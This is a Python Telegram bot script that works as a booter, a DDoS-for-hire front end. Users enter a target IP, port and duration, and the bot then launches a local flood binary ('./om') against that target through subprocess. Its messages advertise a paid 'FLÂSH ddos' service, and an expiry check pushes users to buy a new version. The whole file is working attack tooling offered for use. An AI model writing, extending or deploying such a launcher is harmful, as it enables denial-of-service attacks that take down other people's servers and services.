import subprocess
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from flashh import TOKEN  # Import the TOKEN variable
from datetime import datetime  # Import datetime for expiry checking

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Path to your binary
BINARY_PATH = "./om"

# Expiry date (Change this to the desired expiry date)
EXPIRY_DATE = datetime(2024, 10, 29)  # Set expiry date to 1st November 2024

# Global variables
process = None
target_ip = None
target_port = None
attack_time = None

# Check if the script has expired
def check_expiry():
    current_date = datetime.now()
    if current_date > EXPIRY_DATE:
        return True
    return False

# Start command: Anyone can interact with the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    # Check if script is expired
    if check_expiry():
        # First message with your personal link
        keyboard1 = [[InlineKeyboardButton("SEND MESSAGE", url="https://t.me/FLASH_502")]]  # Define keyboard1 here
        reply_markup1 = InlineKeyboardMarkup(keyboard1)  # Create reply_markup1 based on keyboard1
        await update.message.reply_text(
            "🚀This script has expired. DM for New Script. Made by t.me/FLASH_502",
            reply_markup=reply_markup1
        )

        # Second message with the channel link
        keyboard2 = [[InlineKeyboardButton("JOIN CHANNEL", url="https://t.me/addlist/WMQ6dPbJNDZkNjk1")]]  # Define keyboard2 here
        reply_markup2 = InlineKeyboardMarkup(keyboard2)  # Create reply_markup2 based on keyboard2
        await update.message.reply_text(
            "📢 FLÂSH ddos\nALL TYPE DDOS AVAILABLE:-\n t.me/flashmainchannel",
            reply_markup=reply_markup2
        )
        return

    # If the script is not expired, users can start the attack
    keyboard = [[InlineKeyboardButton("🚀Attack🚀", callback_data='attack')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "By t.me/flashmainchannel 🚀Press the Attack button to start CHIN TAPAK DUM DUM (●'◡'●)",
        reply_markup=reply_markup
    )

# Handle button clicks
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port, attack_time  # Declare globals at the start of the function

    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if query.data == 'attack':
        await query.message.reply_text("By https://t.me/FLASH_502 Please enter the target, port, and time in the format:<target> <port> <time>🚀🚀")
    elif query.data == 'start_attack':
        if process is None:
            try:
                # Start the attack process
                process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)])
                await query.message.reply_text(f"CHIN TAPAK DUM DUM(●'◡'●) FeedBack De Dio Yaad se 😡 :- 👉 https://t.me/FLASH_502 {target_ip}:{target_port} for {attack_time} seconds https://t.me/addlist/WMQ6dPbJNDZkNjk1")
            except Exception as e:
                logging.error(f"Error starting attack: {e}")
                await query.message.reply_text("Error starting attack.")
        else:
            await query.message.reply_text("Attack is already running.")
    elif query.data == 'stop_attack':
        if process is not None:
            try:
                process.terminate()  # Terminate the process
                await query.message.reply_text("CHIN TAPAK DUM DUM ROK DIYA GYA H (●'◡'●) t.me/FLASHddosFEEDBACK ")
                process = None  # Reset the process variable
            except Exception as e:
                logging.error(f"Error stopping attack: {e}")
                await query.message.reply_text("Error stopping attack.")
        else:
            await query.message.reply_text("No attack is currently running.")
    elif query.data == 'reset_attack':
        target_ip = None
        target_port = None
        attack_time = None
        await query.message.reply_text("Attack reset. By https://t.me/FLASH_502\nPlease enter the target, port, and time in the format:<target> <port> <time>🚀")

# Handle target, port, and time input
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port, attack_time  # Declare globals at the start of the function

    user_id = update.message.from_user.id
    try:
        # User input is expected in the format: <target> <port> <time>
        target, port, time = update.message.text.split()
        target_ip = target
        target_port = int(port)
        attack_time = int(time)

        # Show Start, Stop, and Reset buttons after input is received
        keyboard = [
            [InlineKeyboardButton("Start Attack🚀", callback_data='start_attack')],
            [InlineKeyboardButton("Stop Attack❌", callback_data='stop_attack')],
            [InlineKeyboardButton("Reset Attack⚙️", callback_data='reset_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds configured."
                                        "Now choose an action:", reply_markup=reply_markup)
    except ValueError:
        await update.message.reply_text('Invalid format. Please enter in the format: <target> <port> <time>🚀🚀')

# Main function to start the bot
def main():
    # Create Application object with your bot's token
    application = Application.builder().token(TOKEN).build()

    # Register command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Register button handler
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^(attack|start_attack|stop_attack|reset_attack)$'))

    # Register message handler to handle input for target, port, and time
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
